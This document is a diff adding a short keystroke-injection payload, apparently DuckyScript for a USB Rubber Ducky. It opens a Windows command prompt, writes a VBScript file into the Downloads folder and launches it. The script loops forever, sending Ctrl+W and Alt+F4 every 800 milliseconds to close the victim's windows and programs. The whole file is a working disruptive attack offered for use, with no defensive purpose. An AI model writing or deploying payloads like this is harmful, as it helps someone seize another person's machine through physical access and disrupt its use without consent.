@@ -1,0 +1,26 @@
+ESC
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING cd %userprofile%/Downloads
+ENTER
+STRING copy con CW.vbs
+ENTER
+STRING do
+ENTER
+STRING Set objShell = CreateObject("WScript.Shell")
+ENTER
+STRING WScript.Sleep 800
+ENTER
+REM idk PS scrpiting so yeet!
+STRING objShell.SendKeys "^{W} %{f4}"
+ENTER
+STRING loop
+CTRL z
+DELAY 100
+ENTER
+STRING start CW.vbs && exit
+ENTER
